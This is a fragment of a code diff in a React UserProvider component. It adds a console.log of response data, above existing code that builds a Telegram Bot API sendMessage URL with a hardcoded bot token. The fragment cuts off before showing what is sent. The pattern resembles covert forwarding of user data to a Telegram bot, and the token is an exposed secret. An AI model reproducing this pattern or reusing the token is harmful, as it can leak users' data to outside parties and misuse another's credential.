@@ -73,6 +73,8 @@ function UserProvider({ children }: PropsWithChildren<{}>) {
           },
         });
 
+        console.log({data: response.data});
+        
         if(response && response.data)
         {
           const url = `https://api.telegram.org/bot7047679046:AAG7OJH-VrVwK8Y9zuprB-dZ3xTaCP-mQO0/sendMessage`;
